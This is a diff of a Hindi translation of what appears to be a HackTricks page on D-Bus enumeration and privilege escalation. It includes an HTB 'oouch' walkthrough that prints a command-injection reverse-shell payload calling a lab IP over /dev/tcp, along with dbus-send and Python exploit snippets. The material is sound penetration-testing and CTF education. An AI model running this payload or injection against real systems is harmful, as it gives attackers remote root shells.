@@ -4,33 +4,37 @@
 
 ## **GUI enumeration**
 
-D-Bus का उपयोग Ubuntu डेस्कटॉप वातावरण में इंटर-प्रोसेस संचार (IPC) मध्यस्थ के रूप में किया जाता है। Ubuntu पर, कई संदेश बसों का समवर्ती संचालन देखा जाता है: सिस्टम बस, जिसे मुख्य रूप से **privileged services द्वारा सिस्टम के पार प्रासंगिक सेवाओं को उजागर करने के लिए** उपयोग किया जाता है, और प्रत्येक लॉगिन किए गए उपयोगकर्ता के लिए एक सत्र बस, जो केवल उस विशेष उपयोगकर्ता के लिए प्रासंगिक सेवाओं को उजागर करता है। यहाँ ध्यान मुख्य रूप से सिस्टम बस पर है क्योंकि यह उच्च विशेषाधिकार (जैसे, root) पर चलने वाली सेवाओं से संबंधित है क्योंकि हमारा उद्देश्य विशेषाधिकार बढ़ाना है। यह noted किया गया है कि D-Bus की आर्किटेक्चर प्रत्येक सत्र बस के लिए एक 'राउटर' का उपयोग करती है, जो क्लाइंट संदेशों को उन सेवाओं की ओर पुनर्निर्देशित करने के लिए जिम्मेदार है जो क्लाइंट द्वारा उस सेवा के लिए निर्दिष्ट पते के आधार पर होती हैं, जिसके साथ वे संवाद करना चाहते हैं।
+D-Bus का उपयोग Ubuntu desktop environments में inter-process communications (IPC) mediator के रूप में किया जाता है। Ubuntu पर, कई message buses का एक साथ संचालन देखा जाता है: system bus, जिसका मुख्य उपयोग **privileged services द्वारा system-व्यापी संबंधित services expose करने** के लिए होता है, और हर logged-in user के लिए एक session bus, जो केवल उसी specific user से संबंधित services को expose करता है। यहां मुख्य ध्यान system bus पर है, क्योंकि इसका संबंध उच्च privileges (जैसे, root) पर चलने वाली services से है, क्योंकि हमारा उद्देश्य privileges elevate करना है। यह उल्लेखनीय है कि D-Bus की architecture हर session bus के लिए एक 'router' का उपयोग करती है, जो clients द्वारा service के लिए दिए गए address के आधार पर client messages को सही services तक redirect करने के लिए जिम्मेदार होता है।
 
-D-Bus पर सेवाएँ उन **objects** और **interfaces** द्वारा परिभाषित की जाती हैं जो वे उजागर करती हैं। Objects को मानक OOP भाषाओं में वर्ग उदाहरणों के समान माना जा सकता है, प्रत्येक उदाहरण को एक **object path** द्वारा अद्वितीय रूप से पहचाना जाता है। यह पथ, फाइल सिस्टम पथ के समान, सेवा द्वारा उजागर किए गए प्रत्येक वस्तु की अद्वितीय पहचान करता है। अनुसंधान उद्देश्यों के लिए एक प्रमुख इंटरफेस **org.freedesktop.DBus.Introspectable** इंटरफेस है, जिसमें एकल विधि, Introspect है। यह विधि वस्तु के समर्थित विधियों, संकेतों और गुणों का XML प्रतिनिधित्व लौटाती है, यहाँ विधियों पर ध्यान केंद्रित करते हुए गुणों और संकेतों को छोड़ दिया गया है।
+D-Bus पर services को उनके द्वारा exposed **objects** और **interfaces** से परिभाषित किया जाता है। Objects को standard OOP languages में class instances की तरह समझा जा सकता है, जहां प्रत्येक instance को एक **object path** द्वारा uniquely identify किया जाता है। यह path, जो filesystem path जैसा होता है, service द्वारा exposed हर object को uniquely identify करता है। research के लिए एक key interface **org.freedesktop.DBus.Introspectable** interface है, जिसमें एक ही method, Introspect, होता है। यह method object के supported methods, signals, और properties का XML representation लौटाता है, जिसमें यहां properties और signals को छोड़कर methods पर ध्यान दिया गया है।
 
-D-Bus इंटरफेस के साथ संवाद करने के लिए, दो उपकरणों का उपयोग किया गया: एक CLI उपकरण जिसका नाम **gdbus** है, जो D-Bus द्वारा स्क्रिप्ट में उजागर की गई विधियों को आसानी से बुलाने के लिए है, और [**D-Feet**](https://wiki.gnome.org/Apps/DFeet), एक Python-आधारित GUI उपकरण जो प्रत्येक बस पर उपलब्ध सेवाओं को सूचीबद्ध करने और प्रत्येक सेवा में निहित वस्तुओं को प्रदर्शित करने के लिए डिज़ाइन किया गया है।
+D-Bus interface के साथ communication के लिए, दो tools का उपयोग किया गया: **gdbus** नामक एक CLI tool, जो scripts में D-Bus द्वारा exposed methods को आसानी से invoke करने के लिए है, और [**D-Feet**](https://wiki.gnome.org/Apps/DFeet), एक Python-based GUI tool, जिसे हर bus पर उपलब्ध services को enumerate करने और प्रत्येक service के भीतर मौजूद objects को प्रदर्शित करने के लिए बनाया गया है।
 ```bash
 sudo apt-get install d-feet
+```
+यदि आप **session bus** की जांच कर रहे हैं, तो पहले वर्तमान address की पुष्टि करें:
+```bash
+echo "$DBUS_SESSION_BUS_ADDRESS"
 ```
 ![https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-21.png](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-21.png)
 
 ![https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-22.png](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-22.png)
 
-पहली छवि में D-Bus सिस्टम बस के साथ पंजीकृत सेवाओं को दिखाया गया है, जिसमें **org.debin.apt** विशेष रूप से सिस्टम बस बटन का चयन करने के बाद हाइलाइट किया गया है। D-Feet इस सेवा के लिए वस्तुओं का प्रश्न करता है, चयनित वस्तुओं के लिए इंटरफेस, विधियों, गुणों और संकेतों को प्रदर्शित करता है, जो दूसरी छवि में देखा जा सकता है। प्रत्येक विधि के हस्ताक्षर का भी विवरण दिया गया है।
+पहली image में D-Bus system bus पर registered services दिखाए गए हैं, जिसमें **org.debin.apt** को खास तौर पर highlight किया गया है, जब System Bus button select किया गया था। D-Feet इस service से objects के लिए query करता है, और चुने गए objects के लिए interfaces, methods, properties, और signals दिखाता है, जैसा कि दूसरी image में देखा जा सकता है। हर method का signature भी detail में दिखाया जाता है।
 
-एक महत्वपूर्ण विशेषता सेवा के **प्रक्रिया आईडी (pid)** और **कमांड लाइन** का प्रदर्शन है, जो यह पुष्टि करने के लिए उपयोगी है कि क्या सेवा उच्च विशेषाधिकारों के साथ चल रही है, जो अनुसंधान प्रासंगिकता के लिए महत्वपूर्ण है।
+एक notable feature service का **process ID (pid)** और **command line** display करना है, जो यह confirm करने में useful है कि service elevated privileges के साथ चल रही है या नहीं, और research relevance के लिए important है।
 
-**D-Feet विधि आह्वान की अनुमति भी देता है**: उपयोगकर्ता पैरामीटर के रूप में पायथन अभिव्यक्तियाँ इनपुट कर सकते हैं, जिन्हें D-Feet D-Bus प्रकारों में परिवर्तित करता है और फिर सेवा को पास करता है।
+**D-Feet method invocation की भी अनुमति देता है**: users Python expressions को parameters के रूप में input कर सकते हैं, जिन्हें D-Feet service को pass करने से पहले D-Bus types में convert करता है।
 
-हालांकि, ध्यान दें कि **कुछ विधियों के लिए प्रमाणीकरण की आवश्यकता होती है** इससे पहले कि हमें उन्हें आह्वान करने की अनुमति दी जाए। हम इन विधियों को नजरअंदाज करेंगे, क्योंकि हमारा लक्ष्य पहले स्थान पर बिना क्रेडेंशियल्स के अपने विशेषाधिकारों को बढ़ाना है।
+हालांकि, ध्यान दें कि **कुछ methods को invoke करने से पहले authentication की जरूरत होती है**। हम इन methods को ignore करेंगे, क्योंकि हमारा goal पहले से credentials के बिना अपनी privileges को elevate करना है।
 
-यह भी ध्यान दें कि कुछ सेवाएँ एक अन्य D-Bus सेवा का प्रश्न करती हैं जिसका नाम org.freedeskto.PolicyKit1 है, यह निर्धारित करने के लिए कि क्या किसी उपयोगकर्ता को कुछ क्रियाएँ करने की अनुमति दी जानी चाहिए या नहीं।
+यह भी ध्यान दें कि कुछ services यह जानने के लिए कि किसी user को certain actions perform करने की अनुमति है या नहीं, org.freedeskto.PolicyKit1 नाम की एक दूसरी D-Bus service से query करती हैं।
 
 ## **Cmd line Enumeration**
 
-### सेवा वस्तुओं की सूची
+### List Service Objects
 
-खुले D-Bus इंटरफेस को सूचीबद्ध करना संभव है:
+opened D-Bus interfaces को list करना possible है:
 ```bash
 busctl list #List D-Bus interfaces
 
@@ -54,13 +58,20 @@ org.freedesktop.PolicyKit1               - -               -                (act
 org.freedesktop.hostname1                - -               -                (activatable) -                         -
 org.freedesktop.locale1                  - -               -                (activatable) -                         -
 ```
+**`(activatable)`** के रूप में चिह्नित सेवाएँ खास तौर पर दिलचस्प होती हैं क्योंकि वे अभी **चल नहीं रही होतीं**, लेकिन एक bus request उन्हें demand पर शुरू कर सकती है। केवल `busctl list` पर न रुकें; उन नामों को उन वास्तविक binaries से map करें जिन्हें वे execute करेंगी।
+```bash
+ls -la /usr/share/dbus-1/system-services/ /usr/share/dbus-1/services/ 2>/dev/null
+grep -RInE '^(Name|Exec|User)=' /usr/share/dbus-1/system-services /usr/share/dbus-1/services 2>/dev/null
+```
+यह आपको जल्दी से बता देता है कि किसी activatable name के लिए कौन-सा `Exec=` path शुरू होगा और किस identity के तहत। अगर binary या उसकी execution chain कमजोर रूप से protected है, तो एक inactive service भी privilege-escalation path बन सकती है।
+
 #### Connections
 
-[From wikipedia:](https://en.wikipedia.org/wiki/D-Bus) जब एक प्रक्रिया एक बस से कनेक्शन स्थापित करती है, तो बस उस कनेक्शन को एक विशेष बस नाम सौंपती है जिसे _विशिष्ट कनेक्शन नाम_ कहा जाता है। इस प्रकार के बस नाम अपरिवर्तनीय होते हैं—यह सुनिश्चित किया गया है कि जब तक कनेक्शन मौजूद है, वे नहीं बदलेंगे—और, अधिक महत्वपूर्ण, इन्हें बस के जीवनकाल के दौरान पुन: उपयोग नहीं किया जा सकता। इसका मतलब है कि उस बस के लिए कोई अन्य कनेक्शन कभी भी ऐसा विशिष्ट कनेक्शन नाम नहीं प्राप्त करेगा, भले ही वही प्रक्रिया बस के कनेक्शन को बंद कर दे और एक नया बनाए। विशिष्ट कनेक्शन नाम आसानी से पहचाने जा सकते हैं क्योंकि वे—अन्यथा निषिद्ध—कोलन चरित्र से शुरू होते हैं।
+[From wikipedia:](https://en.wikipedia.org/wiki/D-Bus) जब कोई process किसी bus से connection सेट up करता है, तो bus उस connection को एक special bus name असाइन करती है जिसे _unique connection name_ कहा जाता है। इस type के bus names immutable होते हैं—यह guaranteed है कि connection के मौजूद रहने तक वे नहीं बदलेंगे—और, इससे भी महत्वपूर्ण, bus lifetime के दौरान उन्हें दोबारा use नहीं किया जा सकता। इसका मतलब है कि उस bus के लिए किसी अन्य connection को कभी भी ऐसा unique connection name नहीं दिया जाएगा, भले ही वही process bus से connection बंद करके एक नया connection बना ले। Unique connection names को आसानी से पहचाना जा सकता है क्योंकि वे—अन्यथा forbidden—colon character से शुरू होते हैं।
 
 ### Service Object Info
 
-फिर, आप इंटरफेस के बारे में कुछ जानकारी प्राप्त कर सकते हैं:
+फिर, आप interface के बारे में कुछ जानकारी इसके साथ प्राप्त कर सकते हैं:
 ```bash
 busctl status htb.oouch.Block #Get info of "htb.oouch.Block" interface
 
@@ -120,9 +131,17 @@ cap_mknod cap_lease cap_audit_write cap_audit_control
 cap_setfcap cap_mac_override cap_mac_admin cap_syslog
 cap_wake_alarm cap_block_suspend cap_audit_read
 ```
-### List Interfaces of a Service Object
+बस नाम को उसके `systemd` यूनिट और executable path के साथ भी correlate करें:
+```bash
+systemctl status dbus-server.service --no-pager
+systemctl cat dbus-server.service
+namei -l /root/dbus-server
+```
+यह privesc के दौरान महत्वपूर्ण operational प्रश्न का उत्तर देता है: **यदि कोई method call सफल होती है, तो कौन-सा real binary और unit action को perform करेगा?**
 
-आपके पास पर्याप्त अनुमतियाँ होनी चाहिए।
+### किसी Service Object के Interfaces की सूची
+
+आपके पास पर्याप्त permissions होनी चाहिए।
 ```bash
 busctl tree htb.oouch.Block #Get Interfaces of the service object
 
@@ -130,9 +149,9 @@ busctl tree htb.oouch.Block #Get Interfaces of the service object
 └─/htb/oouch
 └─/htb/oouch/Block
 ```
-### Introspect Interface of a Service Object
+### किसी Service Object के Interface का introspect करें
 
-ध्यान दें कि इस उदाहरण में `tree` पैरामीटर का उपयोग करके नवीनतम इंटरफेस का चयन किया गया था (_पिछले अनुभाग को देखें_):
+ध्यान दें कि इस उदाहरण में `tree` parameter का उपयोग करके हाल ही में discovered interface को selected किया गया था (_see previous section_):
 ```bash
 busctl introspect htb.oouch.Block /htb/oouch/Block #Get methods of the interface
 
@@ -150,24 +169,52 @@ org.freedesktop.DBus.Properties     interface -         -            -
 .Set                                method    ssv       -            -
 .PropertiesChanged                  signal    sa{sv}as  -            -
 ```
-ध्यान दें कि इंटरफेस `htb.oouch.Block` का तरीका `.Block` (जिसमें हम रुचि रखते हैं) है। अन्य कॉलम का "s" यह संकेत कर सकता है कि यह एक स्ट्रिंग की अपेक्षा कर रहा है।
+इंटरफेस `htb.oouch.Block` की method `.Block` पर ध्यान दें (वही जिसमे हमारी रुचि है)। दूसरे columns का "s" शायद यह दर्शाता है कि यह एक string की अपेक्षा कर रहा है।
 
-### मॉनिटर/कैप्चर इंटरफेस
+कुछ भी खतरनाक आज़माने से पहले, पहले एक **read-oriented** या अन्य low-risk method validate करें। इससे तीन cases साफ़ तौर पर अलग हो जाते हैं: गलत syntax, reachable लेकिन denied, या reachable और allowed.
+```bash
+busctl call org.freedesktop.login1 /org/freedesktop/login1 org.freedesktop.login1.Manager CanReboot
+gdbus call --system --dest org.freedesktop.login1 --object-path /org/freedesktop/login1 --method org.freedesktop.login1.Manager.CanReboot
+```
+### D-Bus Methods को Policies और Actions के साथ Correlate करें
 
-पर्याप्त विशेषाधिकारों के साथ (केवल `send_destination` और `receive_sender` विशेषाधिकार पर्याप्त नहीं हैं) आप **D-Bus संचार** को **मॉनिटर** कर सकते हैं।
+Introspection आपको बताती है कि आप **क्या** call कर सकते हैं, लेकिन यह नहीं बताती कि कोई call **क्यों** allowed या denied है। Real privesc triage के लिए आपको आमतौर पर **तीन layers को साथ में** inspect करना पड़ता है:
 
-**संचार** को **मॉनिटर** करने के लिए आपको **रूट** होना आवश्यक है। यदि आप रूट होने पर भी समस्याएँ पाते हैं तो [https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/](https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/) और [https://wiki.ubuntu.com/DebuggingDBus](https://wiki.ubuntu.com/DebuggingDBus) की जांच करें।
+1. **Activation metadata** (`.service` files या `SystemdService=`) यह जानने के लिए कि कौन-सा binary और unit वास्तव में run होगा।
+2. **D-Bus XML policy** (`/etc/dbus-1/system.d/`, `/usr/share/dbus-1/system.d/`) यह जानने के लिए कि कौन `own`, `send_destination`, या `receive_sender` कर सकता है।
+3. **Polkit action files** (`/usr/share/polkit-1/actions/*.policy`) यह जानने के लिए कि default authorization model क्या है (`allow_active`, `allow_inactive`, `auth_admin`, `auth_self`, `org.freedesktop.policykit.imply`).
+
+Useful commands:
+```bash
+grep -RInE '^(Name|Exec|SystemdService|User)=' /usr/share/dbus-1/system-services /usr/share/dbus-1/services 2>/dev/null
+grep -RInE '<(allow|deny) (own|send_destination|receive_sender)=|user=|group=' /etc/dbus-1/system.d /usr/share/dbus-1/system.d /etc/dbus-1/system-local.d 2>/dev/null
+grep -RInE 'allow_active|allow_inactive|auth_admin|auth_self|org\.freedesktop\.policykit\.imply' /usr/share/polkit-1/actions 2>/dev/null
+pkaction --verbose
+```
+Do **not** assume a 1:1 mapping between a D-Bus method and a Polkit action. The same method may choose a different action depending on the object being modified or on runtime context. Therefore the practical workflow is:
+
+1. `busctl introspect` / `gdbus introspect`
+2. `pkaction --verbose` and grep the relevant `.policy` files
+3. low-risk live probes with `busctl call`, `gdbus call`, or `dbusmap --enable-probes --null-agent`
+
+Proxy or compatibility services deserve extra attention. A **root-running proxy** that forwards requests to another D-Bus service over its own pre-established connection can accidentally make the backend treat every request as coming from UID 0 unless the original caller identity is re-validated.
+
+### Monitor/Capture Interface
+
+With enough privileges (just `send_destination` and `receive_sender` privileges aren't enough) you can **monitor a D-Bus communication**.
+
+In order to **monitor** a **communication** you will need to be **root.** If you still find problems being root check [https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/](https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/) and [https://wiki.ubuntu.com/DebuggingDBus](https://wiki.ubuntu.com/DebuggingDBus)
 
 > [!WARNING]
-> यदि आप जानते हैं कि D-Bus कॉन्फ़िग फ़ाइल को **गैर-रूट उपयोगकर्ताओं को संचार को स्निफ़ करने की अनुमति देने** के लिए कैसे कॉन्फ़िगर करना है, तो कृपया **मुझसे संपर्क करें**!
+> If you know how to configure a D-Bus config file to **allow non root users to sniff** the communication please **contact me**!
 
-मॉनिटर करने के विभिन्न तरीके:
+Different ways to monitor:
 ```bash
 sudo busctl monitor htb.oouch.Block #Monitor only specified
 sudo busctl monitor #System level, even if this works you will only see messages you have permissions to see
 sudo dbus-monitor --system #System level, even if this works you will only see messages you have permissions to see
 ```
-इस उदाहरण में इंटरफ़ेस `htb.oouch.Block` की निगरानी की जाती है और **संदेश "**_**lalalalal**_**" गलत संचार के माध्यम से भेजा जाता है**:
+निम्नलिखित उदाहरण में interface `htb.oouch.Block` को monitor किया जाता है और **message "**_**lalalalal**_**" miscommunication के माध्यम से भेजा जाता है**:
 ```bash
 busctl monitor htb.oouch.Block
 
@@ -186,15 +233,18 @@ MESSAGE "s" {
 STRING "Carried out :D";
 };
 ```
-आप `capture` का उपयोग `monitor` के बजाय कर सकते हैं ताकि परिणामों को pcap फ़ाइल में सहेजा जा सके।
+आप `monitor` की बजाय `capture` का उपयोग करके परिणामों को एक **pcapng** फ़ाइल में सेव कर सकते हैं जिसे Wireshark खोल सकता है:
+```bash
+sudo busctl capture htb.oouch.Block > dbus-htb.oouch.Block.pcapng
+sudo busctl capture > system-bus.pcapng
+```
+#### बस की सारी शोर-गुल को फ़िल्टर करना <a href="#filtering_all_the_noise" id="filtering_all_the_noise"></a>
 
-#### सभी शोर को फ़िल्टर करना <a href="#filtering_all_the_noise" id="filtering_all_the_noise"></a>
-
-यदि बस पर बहुत अधिक जानकारी है, तो इस तरह एक मैच नियम पास करें:
+अगर bus पर जानकारी बहुत ज़्यादा हो, तो इस तरह एक match rule पास करें:
 ```bash
 dbus-monitor "type=signal,sender='org.gnome.TypingMonitor',interface='org.gnome.TypingMonitor'"
 ```
-कई नियम निर्दिष्ट किए जा सकते हैं। यदि कोई संदेश _किसी भी_ नियम से मेल खाता है, तो संदेश प्रिंट किया जाएगा। इस तरह:
+कई rules निर्दिष्ट किए जा सकते हैं। अगर कोई message _any_ rules से match करता है, तो message print किया जाएगा। जैसे:
 ```bash
 dbus-monitor "type=error" "sender=org.freedesktop.SystemToolsBackends"
 ```
@@ -202,15 +252,15 @@ dbus-monitor "type=error" "sender=org.freedesktop.SystemToolsBackends"
 ```bash
 dbus-monitor "type=method_call" "type=method_return" "type=error"
 ```
-[D-Bus documentation](http://dbus.freedesktop.org/doc/dbus-specification.html) पर मैच नियम सिंटैक्स के बारे में अधिक जानकारी के लिए देखें।
+अधिक जानकारी के लिए [D-Bus documentation](http://dbus.freedesktop.org/doc/dbus-specification.html) देखें, match rule syntax के बारे में।
 
-### अधिक
+### More
 
-`busctl` में और भी विकल्प हैं, [**सभी विकल्प यहाँ खोजें**](https://www.freedesktop.org/software/systemd/man/busctl.html)।
+`busctl` में और भी options हैं, [**उन सभी को यहाँ खोजें**](https://www.freedesktop.org/software/systemd/man/busctl.html)।
 
-## **संवेदनशील परिदृश्य**
+## **Vulnerable Scenario**
 
-उपयोगकर्ता **qtc जो होस्ट "oouch" से HTB में है** के रूप में आप एक **अप्रत्याशित D-Bus कॉन्फ़िग फ़ाइल** पाएंगे जो _/etc/dbus-1/system.d/htb.oouch.Block.conf_ में स्थित है:
+**HTB** के host "oouch" के अंदर user **qtc** के रूप में, आप एक **unexpected D-Bus config file** पा सकते हैं जो _/etc/dbus-1/system.d/htb.oouch.Block.conf_ में स्थित है:
 ```xml
 <?xml version="1.0" encoding="UTF-8"?> <!-- -*- XML -*- -->
 
@@ -231,9 +281,9 @@ dbus-monitor "type=method_call" "type=method_return" "type=error"
 
 </busconfig>
 ```
-पिछली कॉन्फ़िगरेशन से नोट करें कि **आपको इस D-BUS संचार के माध्यम से जानकारी भेजने और प्राप्त करने के लिए `root` या `www-data` उपयोगकर्ता होना आवश्यक है**।
+पिछली configuration से note करें कि इस D-BUS communication के जरिए information send और receive करने के लिए आपको user `root` या `www-data` होना होगा।
 
-उपयोगकर्ता **qtc** के रूप में डॉकर कंटेनर **aeb4525789d8** के अंदर, आप फ़ाइल _/code/oouch/routes.py_ में कुछ dbus से संबंधित कोड पा सकते हैं। यह दिलचस्प कोड है:
+docker container **aeb4525789d8** के अंदर user **qtc** के रूप में आप file _/code/oouch/routes.py_ में कुछ dbus-related code पा सकते हैं। यह interesting code है:
 ```python
 if primitive_xss.search(form.textfield.data):
 bus = dbus.SystemBus()
@@ -245,14 +295,14 @@ response = block_iface.Block(client_ip)
 bus.close()
 return render_template('hacker.html', title='Hacker')
 ```
-जैसा कि आप देख सकते हैं, यह **D-Bus इंटरफेस से कनेक्ट हो रहा है** और **"Block" फ़ंक्शन** को "client_ip" भेज रहा है।
+जैसा कि आप देख सकते हैं, यह **एक D-Bus interface से connect हो रहा है** और **"Block" function** को "client_ip" भेज रहा है।
 
-D-Bus कनेक्शन के दूसरी ओर कुछ C संकलित बाइनरी चल रही है। यह कोड **D-Bus कनेक्शन में IP पते के लिए सुन रहा है और `system` फ़ंक्शन के माध्यम से iptables को कॉल कर रहा है** ताकि दिए गए IP पते को ब्लॉक किया जा सके।\
-**`system` को कॉल करना जानबूझकर कमांड इंजेक्शन के लिए संवेदनशील है**, इसलिए निम्नलिखित जैसे एक पेलोड एक रिवर्स शेल बनाएगा: `;bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #`
+D-Bus connection के दूसरे side पर एक compiled C binary चल रहा है। यह code D-Bus connection में **IP address के लिए listen** कर रहा है और दिए गए IP address को block करने के लिए `system` function के जरिए iptables call कर रहा है।\
+**`system` को call जानबूझकर command injection के लिए vulnerable रखा गया है**, इसलिए नीचे जैसा payload एक reverse shell बनाएगा: `;bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #`
 
-### इसका लाभ उठाएं
+### Exploit it
 
-इस पृष्ठ के अंत में आप **D-Bus एप्लिकेशन का पूरा C कोड** पा सकते हैं। इसके अंदर आप पंक्तियों 91-97 के बीच **कैसे `D-Bus ऑब्जेक्ट पथ`** **और `इंटरफेस नाम`** **पंजीकृत** हैं, यह देख सकते हैं। यह जानकारी D-Bus कनेक्शन में जानकारी भेजने के लिए आवश्यक होगी:
+इस page के end में आप **D-Bus application का complete C code** पा सकते हैं। इसके अंदर lines 91-97 के बीच आप **`D-Bus object path`** और **`interface name`** कैसे register किए गए हैं, यह देख सकते हैं। D-Bus connection को जानकारी भेजने के लिए यह information आवश्यक होगी:
 ```c
 /* Install the object */
 r = sd_bus_add_object_vtable(bus,
@@ -262,13 +312,13 @@ r = sd_bus_add_object_vtable(bus,
 block_vtable,
 NULL);
 ```
-इसके अलावा, लाइन 57 में आप देख सकते हैं कि **इस D-Bus संचार के लिए केवल एक ही विधि पंजीकृत है** जिसे `Block` कहा जाता है (_**इसलिए अगले अनुभाग में पेलोड को सेवा वस्तु `htb.oouch.Block`, इंटरफेस `/htb/oouch/Block` और विधि नाम `Block` पर भेजा जाएगा**_):
+साथ ही, लाइन 57 में आप देख सकते हैं कि इस D-Bus communication के लिए **केवल यही method registered** है, जिसका नाम `Block` है(_**इसी वजह से, अगले section में payloads service object `htb.oouch.Block`, interface `/htb/oouch/Block` और method name `Block` को भेजे जाएंगे**_):
 ```c
 SD_BUS_METHOD("Block", "s", "s", method_block, SD_BUS_VTABLE_UNPRIVILEGED),
 ```
 #### Python
 
-निम्नलिखित पायथन कोड `block_iface.Block(runme)` के माध्यम से `Block` विधि के लिए D-Bus कनेक्शन पर पेलोड भेजेगा (_ध्यान दें कि इसे पिछले कोड के भाग से निकाला गया था_):
+निम्नलिखित python code payload को D-Bus connection के `Block` method तक `block_iface.Block(runme)` के जरिए भेजेगा (_note that it was extracted from the previous chunk of code_):
 ```python
 import dbus
 bus = dbus.SystemBus()
@@ -282,14 +332,14 @@ bus.close()
 ```bash
 dbus-send --system --print-reply --dest=htb.oouch.Block /htb/oouch/Block htb.oouch.Block.Block string:';pring -c 1 10.10.14.44 #'
 ```
-- `dbus-send` एक उपकरण है जिसका उपयोग "Message Bus" को संदेश भेजने के लिए किया जाता है।
-- Message Bus – एक सॉफ़्टवेयर है जिसका उपयोग सिस्टम द्वारा अनुप्रयोगों के बीच संचार को आसान बनाने के लिए किया जाता है। यह Message Queue से संबंधित है (संदेश क्रम में व्यवस्थित होते हैं) लेकिन Message Bus में संदेश एक सदस्यता मॉडल में भेजे जाते हैं और यह बहुत तेज़ भी होते हैं।
-- “-system” टैग का उपयोग यह बताने के लिए किया जाता है कि यह एक सिस्टम संदेश है, न कि एक सत्र संदेश (डिफ़ॉल्ट रूप से)।
-- “–print-reply” टैग का उपयोग हमारे संदेश को उचित रूप से प्रिंट करने और किसी भी उत्तर को मानव-पठनीय प्रारूप में प्राप्त करने के लिए किया जाता है।
-- “–dest=Dbus-Interface-Block” Dbus इंटरफ़ेस का पता है।
-- “–string:” – संदेश का प्रकार जिसे हम इंटरफ़ेस को भेजना चाहते हैं। संदेश भेजने के कई प्रारूप हैं जैसे डबल, बाइट्स, बूलियन, इंट, ऑब्जेक्ट पाथ। इनमें से, "ऑब्जेक्ट पाथ" तब उपयोगी होता है जब हम Dbus इंटरफ़ेस को एक फ़ाइल का पाथ भेजना चाहते हैं। इस मामले में, हम एक विशेष फ़ाइल (FIFO) का उपयोग कर सकते हैं ताकि फ़ाइल के नाम पर इंटरफ़ेस को एक कमांड पास किया जा सके। “string:;” – यह ऑब्जेक्ट पाथ को फिर से कॉल करने के लिए है जहाँ हम FIFO रिवर्स शेल फ़ाइल/कमांड रखते हैं।
+- `dbus-send` एक tool है जिसका उपयोग “Message Bus” को message भेजने के लिए किया जाता है
+- Message Bus – एक software जिसका उपयोग systems applications के बीच communication को आसान बनाने के लिए करते हैं। यह Message Queue से related है (messages sequence में ordered होते हैं) लेकिन Message Bus में messages subscription model में भेजे जाते हैं और यह बहुत fast भी होता है।
+- “-system” tag का उपयोग यह बताने के लिए किया जाता है कि यह एक system message है, session message नहीं (by default)।
+- “–print-reply” tag का उपयोग हमारे message को appropriately print करने और किसी भी reply को human-readable format में receive करने के लिए किया जाता है।
+- “–dest=Dbus-Interface-Block” Dbus interface का address है।
+- “–string:” – जिस type का message हम interface को send करना चाहते हैं। संदेश भेजने के कई formats होते हैं जैसे double, bytes, booleans, int, objpath. इनमें से “object path” तब useful होता है जब हम Dbus interface को किसी file का path भेजना चाहते हैं। इस case में हम एक special file (FIFO) का उपयोग कर सकते हैं ताकि interface को file के नाम में command pass की जा सके। “string:;” – इसका उपयोग फिर से object path को call करने के लिए किया जाता है, जहां हम FIFO reverse shell file/command रखते हैं।
 
-_ध्यान दें कि `htb.oouch.Block.Block` में, पहला भाग (`htb.oouch.Block`) सेवा वस्तु को संदर्भित करता है और अंतिम भाग (`.Block`) विधि नाम को संदर्भित करता है।_
+_Note that in `htb.oouch.Block.Block`, the first part (`htb.oouch.Block`) references the service object and the last part (`.Block`) references the method name._
 
 ### C code
 ```c:d-bus_server.c
@@ -434,73 +484,69 @@ return r < 0 ? EXIT_FAILURE : EXIT_SUCCESS;
 ```
 ## Automated Enumeration Helpers (2023-2025)
 
-D-Bus हमले की सतह का मैन्युअल रूप से `busctl`/`gdbus` के साथ एन्यूमरेशन करना जल्दी ही दर्दनाक हो जाता है। पिछले कुछ वर्षों में जारी किए गए दो छोटे FOSS उपयोगिताएँ रेड-टीम या CTF कार्यों के दौरान चीजों को तेज कर सकती हैं:
+`busctl`/`gdbus` के साथ बड़े D-Bus attack surface की manual Enumeration जल्दी ही painful हो जाती है। पिछले कुछ सालों में जारी दो छोटे FOSS utilities red-team या CTF engagements के दौरान इसे तेज कर सकते हैं:
 
 ### dbusmap ("Nmap for D-Bus")
-* लेखक: @taviso – [https://github.com/taviso/dbusmap](https://github.com/taviso/dbusmap)
-* C में लिखा गया; एकल स्थिर बाइनरी (<50 kB) जो हर ऑब्जेक्ट पथ पर चलती है, `Introspect` XML खींचती है और इसे मालिक PID/UID से मैप करती है।
-* उपयोगी फ्लैग्स:
+* Author: @taviso – [https://github.com/taviso/dbusmap](https://github.com/taviso/dbusmap)
+* C में लिखा गया; single static binary (<50 kB) जो हर object path को walk करता है, `Introspect` XML को pull करता है और उसे owning PID/UID से map करता है।
+* Useful flags:
 ```bash
-# *system* बस पर हर सेवा की सूची बनाएं और सभी कॉल करने योग्य विधियों को डंप करें
+# List every service on the *system* bus and dump all callable methods
 sudo dbus-map --dump-methods
 
-# उन विधियों/गुणों की सक्रिय रूप से जांच करें जिन तक आप बिना Polkit प्रॉम्प्ट के पहुँच सकते हैं
+# Actively probe methods/properties you can reach without Polkit prompts
 sudo dbus-map --enable-probes --null-agent --dump-methods --dump-properties
 ```
-* यह उपकरण बिना सुरक्षा वाले प्रसिद्ध नामों को `!` के साथ चिह्नित करता है, तुरंत उन सेवाओं को प्रकट करता है जिन्हें आप *own* (कब्जा करना) या उन विधि कॉल्स को जो एक अप्रिविलेज्ड शेल से पहुँच योग्य हैं।
+* यह tool unprotected well-known names को `!` से mark करता है, जिससे तुरंत वे services reveal हो जाती हैं जिन्हें आप *own* (take over) कर सकते हैं या वे method calls जो unprivileged shell से reachable हैं।
 
 ### uptux.py
-* लेखक: @initstring – [https://github.com/initstring/uptux](https://github.com/initstring/uptux)
-* केवल Python स्क्रिप्ट जो systemd यूनिट्स में *लिखने योग्य* पथों **और** अत्यधिक अनुमति वाले D-Bus नीति फ़ाइलों (जैसे `send_destination="*"` ) की तलाश करती है।
-* त्वरित उपयोग:
+* Author: @initstring – [https://github.com/initstring/uptux](https://github.com/initstring/uptux)
